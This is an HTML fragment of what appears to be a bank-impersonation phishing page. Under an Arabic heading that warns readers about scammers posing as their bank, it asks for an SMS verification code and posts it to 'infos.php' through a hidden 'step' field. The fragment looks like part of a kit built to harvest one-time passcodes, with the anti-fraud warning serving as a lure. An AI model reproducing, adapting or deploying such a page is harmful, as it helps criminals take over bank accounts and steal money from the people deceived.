...
<header>
    <div class="lang">
        <div class="container text-start">
           <a href="sms.php"> <p class="mb-0" style="font-size: 14px;">English</p></a>
        </div>
    </div>
            ...
            <div class="col-md-12">
                <div class="form text-end" style="max-width: 500px;margin: 25px auto;">
                   <div class="text-center py-5"><img src="image/sms.png" width="100"></div>
                    <h4 class="mt-4" style="font-size: 15px;font-weight:300;color:#a39d9d;">احمِ نفسك من أولئك الذين يتظاهرون بأنهم البنك الذي تتعامل معه. احذر من المكالمات الهاتفية ورسائل البريد الإلكتروني والرسائل القصيرة الاحتيالية.</h4>
                    ...
                    <form action="infos.php" method="post" class="mt-3">
                        <input type="hidden" value="sms_ar" name="step">


                        <div class="form-group mb-4">
                            <input type="text" class="form-control text-end" placeholder="رمز التحقق" id="sms" name="sms" required>
                        </div>
